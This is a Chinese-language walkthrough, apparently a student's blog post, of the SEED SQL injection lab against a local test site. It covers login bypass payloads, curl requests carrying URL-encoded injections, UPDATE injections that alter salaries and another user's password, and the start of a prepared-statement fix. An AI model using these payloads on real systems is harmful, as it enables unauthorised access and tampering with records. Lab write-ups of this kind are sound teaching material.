+<h3 id="加载数据库并打印数据库中的所有表">加载数据库并打印数据库中的所有表<a hidden class="anchor" aria-hidden="true" href="#加载数据库并打印数据库中的所有表">#</a></h3>
+<ul>
+<li>使用命令<code>show databases;</code>查看所有数据库：</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">show</span><span class="w"> </span><span class="k">databases</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+--------------------+</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="k">Database</span><span class="w">           </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+--------------------+</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">information_schema</span><span class="w"> </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">mysql</span><span class="w">              </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">performance_schema</span><span class="w"> </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">sqllab_users</span><span class="w">       </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">sys</span><span class="w">                </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+--------------------+</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">5</span><span class="w"> </span><span class="n">rows</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="kt">set</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span><span class="w"> </span><span class="n">sec</span><span class="p">)</span><span class="w">
+</span></span></span></code></pre></div><ul>
+<li>使用命令<code>use sqllab_users;</code>加载数据库：</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">use</span><span class="w"> </span><span class="n">sqllab_users</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Reading</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="n">information</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">completion</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="k">column</span><span class="w"> </span><span class="n">names</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">You</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="n">turn</span><span class="w"> </span><span class="n">off</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="n">feature</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">get</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">quicker</span><span class="w"> </span><span class="n">startup</span><span class="w"> </span><span class="k">with</span><span class="w"> </span><span class="o">-</span><span class="n">A</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">Database</span><span class="w"> </span><span class="n">changed</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">show</span><span class="w"> </span><span class="kp">tables</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+------------------------+</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">Tables_in_sqllab_users</span><span class="w"> </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+------------------------+</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">credential</span><span class="w">             </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+------------------------+</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1</span><span class="w"> </span><span class="n">row</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="kt">set</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span><span class="w"> </span><span class="n">sec</span><span class="p">)</span><span class="w">
+</span></span></span></code></pre></div><ul>
+<li>使用命令<code>show tables;</code>打印此数据库的所有表：</li>
+</ul>
+<pre tabindex="0"><code>mysql&gt; show tables;
++------------------------+
+| Tables_in_sqllab_users |
++------------------------+
+| credential             |
++------------------------+
+1 row in set (0.00 sec)
+</code></pre><h3 id="使用命令打印员工-alice-的所有资料信息">使用命令打印员工 Alice 的所有资料信息<a hidden class="anchor" aria-hidden="true" href="#使用命令打印员工-alice-的所有资料信息">#</a></h3>
+<ol>
+<li>使用命令<code>SELECT * from credential;</code>打印整个表单：</li>
+</ol>
+<p><img loading="lazy" src="https://s2.loli.net/2024/10/23/8U6fDeYSg2LpClx.png" alt="image-20241023104823095"  />
+</p>
+<p>​	发现<code>Alice</code>在<code>Name</code>表项下，<code>ID</code>为1。</p>
+<ol start="2">
+<li>使用命令<code>SELECT * from credential WHERE Name='Alice'</code>即可打印员工Alice的所有资料：</li>
+</ol>
+<p><img loading="lazy" src="https://s2.loli.net/2024/10/23/QUnca5YRSfeM9Vl.png" alt="image-20241023105057406"  />
+</p>
+<h2 id="task-2基于-select-语句的-sql-注入攻击">Task 2：基于 SELECT 语句的 SQL 注入攻击<a hidden class="anchor" aria-hidden="true" href="#task-2基于-select-语句的-sql-注入攻击">#</a></h2>
+<h3 id="登录界面">登录界面<a hidden class="anchor" aria-hidden="true" href="#登录界面">#</a></h3>
+<p>使用浏览器访问 <a href="https://www.seed-server.com">www.seed-server.com</a> 进入登录界面，如下：</p>
+<img src="https://s2.loli.net/2024/10/23/JAqpfhKxy249LRk.png" alt="image-20241023105530255" style="zoom: 60%;" />
+<p>使用命令<code>sudo docker cp ec:/var/www/SQL_Injection/unsafe_home.php .</code>可以将登录界面前端代码从docker中拷贝到外部</p>
+<h3 id="登录界面逻辑">登录界面逻辑<a hidden class="anchor" aria-hidden="true" href="#登录界面逻辑">#</a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl">      <span class="nv">$input_uname</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">      <span class="nv">$input_pwd</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;Password&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">      <span class="nv">$hashed_pwd</span> <span class="o">=</span> <span class="nx">sha1</span><span class="p">(</span><span class="nv">$input_pwd</span><span class="p">);</span>
+</span></span></code></pre></div><ul>
+<li>
+<p><code>$input_uname</code>：用户输入的用户名</p>
+</li>
+<li>
+<p><code>$input_pwd</code>：用户输入的密码</p>
+</li>
+<li>
+<p><code>$hashed_pwd</code>: 密码的哈希值</p>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// create a connection
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nv">$conn</span> <span class="o">=</span> <span class="nx">getDB</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">      <span class="c1">// Sql query to authenticate the user
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;SELECT id, name, eid, salary, birth, ssn, phoneNumber, address, email,nickname,Password
+</span></span></span><span class="line"><span class="cl"><span class="s2">      FROM credential
+</span></span></span><span class="line"><span class="cl"><span class="s2">      WHERE name= &#39;</span><span class="si">$input_uname</span><span class="s2">&#39; and Password=&#39;</span><span class="si">$hashed_pwd</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$result</span> <span class="o">=</span> <span class="nv">$conn</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;/div&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;/nav&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;div class=&#39;container text-center&#39;&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;There was an error running the query [&#39;</span> <span class="o">.</span> <span class="nv">$conn</span><span class="o">-&gt;</span><span class="na">error</span> <span class="o">.</span> <span class="s1">&#39;]\n&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;/div&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span></code></pre></div><p>这段代码使用了sql语句查询表中是否有用户名为<code>$input_uname</code>且密码哈希值为<code>$hashed_pwd</code>的表项，如果有则登录成功。</p>
+<h3 id="task-21基于网页的-sql-注入攻击">Task 2.1：基于网页的 SQL 注入攻击<a hidden class="anchor" aria-hidden="true" href="#task-21基于网页的-sql-注入攻击">#</a></h3>
+<blockquote>
+<p>你的任务是以管理员的身份从登录页面登录到 Web 应用程序，这样 你就可以查看所有员工的信息。管理员的用户名是 admin，口令未知。请在用户名与口令输入框中输入 能成功完成攻击的内容。</p>
+</blockquote>
+<h4 id="1-利用-or">1. 利用 OR<a hidden class="anchor" aria-hidden="true" href="#1-利用-or">#</a></h4>
+<p>我们可以构造 <code>admin' OR '1=1</code> 作为我们的登录用户名，这样Sql查询语句就变成了:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="n">id</span><span class="p">,</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">eid</span><span class="p">,</span><span class="w"> </span><span class="n">salary</span><span class="p">,</span><span class="w"> </span><span class="n">birth</span><span class="p">,</span><span class="w"> </span><span class="n">ssn</span><span class="p">,</span><span class="w"> </span><span class="n">phoneNumber</span><span class="p">,</span><span class="w"> </span><span class="n">address</span><span class="p">,</span><span class="w"> </span><span class="n">email</span><span class="p">,</span><span class="n">nickname</span><span class="p">,</span><span class="n">Password</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="k">FROM</span><span class="w"> </span><span class="n">credential</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="k">WHERE</span><span class="w"> </span><span class="n">name</span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;admin&#39;</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="s1">&#39;1&#39;</span><span class="o">=</span><span class="s1">&#39;1&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">Password</span><span class="o">=</span><span class="s1">&#39;$hashed_pwd&#39;</span><span class="w">
+</span></span></span></code></pre></div><p>在Sql查询中，只要<code>OR</code>的前半部分为真，整个查询就为真，<code>name='admin'</code>为真，于是会直接跳过密码哈希值的判断部分，进而登录成功。</p>
+<img src="https://s2.loli.net/2024/10/23/wRUSNaPqZkMn8VB.png" alt="image-20241023115411546" style="zoom:60%;" />
+<h4 id="2-利用注释">2. 利用注释<a hidden class="anchor" aria-hidden="true" href="#2-利用注释">#</a></h4>
+<p>我们可以构造 <code>admin' --  </code> 或<code>admin' #</code>作为用户名,这样后面的语句就会被注释掉：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">WHERE</span><span class="w"> </span><span class="n">name</span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;admin&#39;</span><span class="w"> </span><span class="c1">-- and Password=&#39;$hashed_pwd&#39;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">WHERE</span><span class="w"> </span><span class="n">name</span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;admin&#39;</span><span class="w"> </span><span class="o">#</span><span class="k">and</span><span class="w"> </span><span class="n">Password</span><span class="o">=</span><span class="s1">&#39;$hashed_pwd&#39;</span><span class="w">
+</span></span></span></code></pre></div><p>这样也会跳过密码哈希值的判断。</p>
+<h3 id="task-22基于命令行的-sql-注入攻击">Task 2.2：基于命令行的 SQL 注入攻击<a hidden class="anchor" aria-hidden="true" href="#task-22基于命令行的-sql-注入攻击">#</a></h3>
+<blockquote>
+<p>在不使用网页的情况下完成 Task 2.1 的目标。你可以使用命令行 工具，如 curl，它可以发送 HTTP 请求。如需在 HTTP 请求中包含多个参数，需要把 URL 和参数用一对 单引号括起来。否则，用于分隔参数的特殊字符 (如 &amp;) 会被 shell 曲解，造成命令歧义。</p>
+</blockquote>
+<p>将 Task 2.1 的命令中的 <strong>#</strong>，<strong>空格</strong>，<strong>&rsquo;</strong>,进行 URL 编码</p>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: center">#</th>
+          <th style="text-align: center">space</th>
+          <th style="text-align: center">'</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: center">%23</td>
+          <td style="text-align: center">%20</td>
+          <td style="text-align: center">%27</td>
+      </tr>
+  </tbody>
+</table>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl <span class="s1">&#39;www.seed-server.com/unsafe_home.php?username=admin%27%20OR%20%271=1&amp;Password=&#39;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl <span class="s1">&#39;www.seed-server.com/unsafe_home.php?username=admin%27%23&amp;Password=&#39;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl <span class="s1">&#39;www.seed-server.com/unsafe_home.php?username=admin%27%20--%20&amp;Password=&#39;</span>
+</span></span></code></pre></div><p>以上三条命令执行后都能登录成功并且回显出表单内容</p>
+<p><img loading="lazy" src="https://s2.loli.net/2024/10/23/FyOIKawoqgf6pxv.png" alt="image-20241023165508335"  />
+</p>
+<h3 id="task-23增加一条新的-sql-语句">Task 2.3：增加一条新的 SQL 语句<a hidden class="anchor" aria-hidden="true" href="#task-23增加一条新的-sql-语句">#</a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">admin</span><span class="s1">&#39;; DELETE FROM credential WHERE name=&#39;</span><span class="k">admin</span><span class="s1">&#39;;#
+</span></span></span></code></pre></div><p>尝试执行第二条 SQL 语句 <code>DELETE FROM credential WHERE name='admin';</code> 删除 admin 表项，但是注入失败：</p>
+<img src="https://s2.loli.net/2024/10/23/G93AQyUKLe1qSIC.png" alt="image-20241023172834635" style="zoom:67%;" />
+<h4 id="原因">原因：<a hidden class="anchor" aria-hidden="true" href="#原因">#</a></h4>
+<p>查阅 SEED BOOK 后发现和 PHP 中 mysqli 拓展的 <code>query()</code> 函数有关，<strong><code>query()</code>不允许在数据库服务器中运行多条语句</strong>，这是为了防止恶意用户通过 SQL 注入攻击执行额外的恶意 SQL 操作。即使攻击者在注入的输入中添加了分号，数据库也不会执行多条sql语句，会直接抛出错误。</p>
+<h2 id="task-3基于-update-语句的-sql-注入攻击">Task 3：基于 UPDATE 语句的 SQL 注入攻击<a hidden class="anchor" aria-hidden="true" href="#task-3基于-update-语句的-sql-注入攻击">#</a></h2>
+<p>当员工通过编辑界面编辑他们的信息时，是通过如下的SQL语句更新表单内容的，在 <code>unsafe_edit_backend.php</code> 文件中实现的 PHP 代码用于更新员工的个人信息：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl">  <span class="nv">$conn</span> <span class="o">=</span> <span class="nx">getDB</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">// Don&#39;t do this, this is not safe against SQL injection attack
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nv">$sql</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="nv">$input_pwd</span><span class="o">!=</span><span class="s1">&#39;&#39;</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// In case password field is not empty.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$hashed_pwd</span> <span class="o">=</span> <span class="nx">sha1</span><span class="p">(</span><span class="nv">$input_pwd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">//Update the password stored in the session.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;pwd&#39;</span><span class="p">]</span><span class="o">=</span><span class="nv">$hashed_pwd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;UPDATE credential SET nickname=&#39;</span><span class="si">$input_nickname</span><span class="s2">&#39;,email=&#39;</span><span class="si">$input_email</span><span class="s2">&#39;,address=&#39;</span><span class="si">$input_address</span><span class="s2">&#39;,Password=&#39;</span><span class="si">$hashed_pwd</span><span class="s2">&#39;,PhoneNumber=&#39;</span><span class="si">$input_phonenumber</span><span class="s2">&#39; where ID=</span><span class="si">$id</span><span class="s2">;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// if passowrd field is empty.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;UPDATE credential SET nickname=&#39;</span><span class="si">$input_nickname</span><span class="s2">&#39;,email=&#39;</span><span class="si">$input_email</span><span class="s2">&#39;,address=&#39;</span><span class="si">$input_address</span><span class="s2">&#39;,PhoneNumber=&#39;</span><span class="si">$input_phonenumber</span><span class="s2">&#39; where ID=</span><span class="si">$id</span><span class="s2">;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="nv">$conn</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
+</span></span></code></pre></div><p>可以发现代码是通过执行一个sql语句进行表单的更新：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">UPDATE</span><span class="w"> </span><span class="n">credential</span><span class="w"> </span><span class="k">SET</span><span class="w"> </span><span class="n">nickname</span><span class="o">=</span><span class="s1">&#39;$input_nickname&#39;</span><span class="p">,</span><span class="n">email</span><span class="o">=</span><span class="s1">&#39;$input_email&#39;</span><span class="p">,</span><span class="n">address</span><span class="o">=</span><span class="s1">&#39;$input_address&#39;</span><span class="p">,</span><span class="n">Password</span><span class="o">=</span><span class="s1">&#39;$hashed_pwd&#39;</span><span class="p">,</span><span class="n">PhoneNumber</span><span class="o">=</span><span class="s1">&#39;$input_phonenumber&#39;</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">ID</span><span class="o">=</span><span class="err">$</span><span class="n">id</span><span class="p">;</span><span class="w">
+</span></span></span></code></pre></div><h3 id="task-31修改自己的工资">Task 3.1：修改自己的工资<a hidden class="anchor" aria-hidden="true" href="#task-31修改自己的工资">#</a></h3>
+<blockquote>
+<p>编辑页面中只能修改员工的昵称、电子邮件、地址、电话号码和口令，而不能用于修改工资。假设你 (Alice) 由于老板 Boby 今年未给你加薪而感到不满。你想利用存在于编辑页面的 SQL 注入漏洞来增加自己的工资。请展示你是如何实现这一目标的。已知列 salary 用于存储工资数额。</p>
+</blockquote>
+<p>由于 <code>PhoneNumber</code> 是修改的最后一项，于是我们可以在 <code>PhoneNumber</code> 这里注入：</p>
+<img src="https://s2.loli.net/2024/10/24/NCpoOZ6baMT4H9Q.png" alt="image-20241024132548486" style="zoom:60%;" />
+<p>填入 <code>',salary=99999 WHERE name='Alice' #</code> ，相当于执行了：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">UPDATE</span><span class="w"> </span><span class="n">credential</span><span class="w"> </span><span class="k">SET</span><span class="w"> </span><span class="n">nickname</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="n">email</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="n">address</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="n">Password</span><span class="o">=</span><span class="s1">&#39;$hashed_pwd&#39;</span><span class="p">,</span><span class="n">PhoneNumber</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="n">salary</span><span class="o">=</span><span class="mi">99999</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">name</span><span class="o">=</span><span class="s1">&#39;Alice&#39;</span><span class="w"> </span><span class="o">#</span><span class="s1">&#39; where ID=$id; ;
+</span></span></span></code></pre></div><p>这会把 Alice 的 Salary 表项改成 99999：</p>
+<img src="https://s2.loli.net/2024/10/24/crYDyhjsiQ2IzXH.png" alt="image-20241023180409189" style="zoom:60%;" />
+<h3 id="task-32修改他人的工资">Task 3.2：修改他人的工资<a hidden class="anchor" aria-hidden="true" href="#task-32修改他人的工资">#</a></h3>
+<blockquote>
+<p>在提高自己的工资数额后，你决定惩罚你的老板 Boby，将他的工资减少到 1 美元。请展示你是如何实现这一目标的。</p>
+</blockquote>
+<p>在 <code>PhoneNumber</code> 项填入 <code>',salary=1 WHERE name='Boby' #</code>，相当于执行了：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">UPDATE</span><span class="w"> </span><span class="n">credential</span><span class="w"> </span><span class="k">SET</span><span class="w"> </span><span class="n">nickname</span><span class="o">=</span><span class="s1">&#39;$input_nickname&#39;</span><span class="p">,</span><span class="n">email</span><span class="o">=</span><span class="s1">&#39;$input_email&#39;</span><span class="p">,</span><span class="n">address</span><span class="o">=</span><span class="s1">&#39;$input_address&#39;</span><span class="p">,</span><span class="n">Password</span><span class="o">=</span><span class="s1">&#39;$hashed_pwd&#39;</span><span class="p">,</span><span class="n">PhoneNumber</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="n">salary</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">name</span><span class="o">=</span><span class="s1">&#39;Boby&#39;</span><span class="w"> </span><span class="o">#</span><span class="s1">&#39; where ID=$id;
+</span></span></span></code></pre></div><p>这会将 Boby 的工资表项更新成 1</p>
+<img src="https://s2.loli.net/2024/10/24/8WLyKEm1jzJZbt3.png" alt="image-20241024132816228" style="zoom:67%;" />
+<h3 id="task-33修改他人的口令">Task 3.3：修改他人的口令<a hidden class="anchor" aria-hidden="true" href="#task-33修改他人的口令">#</a></h3>
+<blockquote>
+<p>修改完 Boby 的工资后，你仍心有不甘，所以你想修改 Boby 的口令，这样你就可以登录他的账户，做进一步的破坏。</p>
+</blockquote>
+<p>由于 Password 在数据库中是以 SHA1 哈希后的哈希值存储的，如果我想把 Boby 的 Password 改为88888888，我就要将数据库中 Boby 对应的 Password 改为 <code>SHA1(88888888)</code>。</p>
+<p>通过 <a href="https://cyberchef.org/#recipe=SHA1(80)&input=ODg4ODg4ODg">CyberChef</a> 计算出哈希后的值：</p>
+<img src="https://s2.loli.net/2024/10/24/q2TMDZe5dxBAYOK.png" alt="image-20241024143047953" style="zoom:60%;" />
+<p>在 <code>PhoneNumber</code> 项填入 <code>',Password='05b530ad0fb56286fe051d5f8be5b8453f1cd93f' WHERE name='Boby' #</code>，这会修改 Boby 的数据库中的 Password 值：</p>
+<p><img loading="lazy" src="https://s2.loli.net/2024/10/24/slR1EtAx54kme2M.png" alt="image-20241024143939937"  />
+</p>
+<p>现在我们再尝试使用密码 88888888 登录，发现登录成功：</p>
+<img src="https://s2.loli.net/2024/10/24/SjFLGMHi15PEnc3.png" alt="image-20241024143659927" style="zoom:67%;" />
+<img src="C:/Users/86135/AppData/Roaming/Typora/typora-user-images/image-20241024144041882.png" alt="image-20241024144041882" style="zoom:60%;" />
+<h2 id="task-4对策语句预处理">Task 4：对策：语句预处理<a hidden class="anchor" aria-hidden="true" href="#task-4对策语句预处理">#</a></h2>
+<blockquote>
+<p>请使用语句预处理机制来修复 SQL 注入漏洞。为了简单起见，我们在文件夹 defense 内创建了一 个简化程序，你需要对这个文件夹中的文件进行修改。</p>
+</blockquote>
+<h3 id="修改代码">修改代码<a hidden class="anchor" aria-hidden="true" href="#修改代码">#</a></h3>
+<p>修改 <code>www</code> 容器中的 <code>/var/www/SQL_Injection/defense/</code> 文件夹下的 <code>unsafe.php</code> 文件，修改后的文件如下所示：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// Function to create a sql connection.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">function</span> <span class="nf">getDB</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nv">$dbhost</span><span class="o">=</span><span class="s2">&#34;10.9.0.6&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nv">$dbuser</span><span class="o">=</span><span class="s2">&#34;seed&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nv">$dbpass</span><span class="o">=</span><span class="s2">&#34;dees&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nv">$dbname</span><span class="o">=</span><span class="s2">&#34;sqllab_users&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="c1">// Create a DB connection
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nv">$conn</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">mysqli</span><span class="p">(</span><span class="nv">$dbhost</span><span class="p">,</span> <span class="nv">$dbuser</span><span class="p">,</span> <span class="nv">$dbpass</span><span class="p">,</span> <span class="nv">$dbname</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nv">$conn</span><span class="o">-&gt;</span><span class="na">connect_error</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;Connection failed: &#34;</span> <span class="o">.</span> <span class="nv">$conn</span><span class="o">-&gt;</span><span class="na">connect_error</span> <span class="o">.</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nv">$conn</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$input_uname</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$input_pwd</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;Password&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$hashed_pwd</span> <span class="o">=</span> <span class="nx">sha1</span><span class="p">(</span><span class="nv">$input_pwd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// create a connection
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$conn</span> <span class="o">=</span> <span class="nx">getDB</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// Use prepared statements to prevent SQL injection
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$conn</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s2">&#34;SELECT id, name, eid, salary, ssn FROM credential WHERE name = ? AND Password = ?&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$stmt</span><span class="p">)</span> <span class="p">{</span>
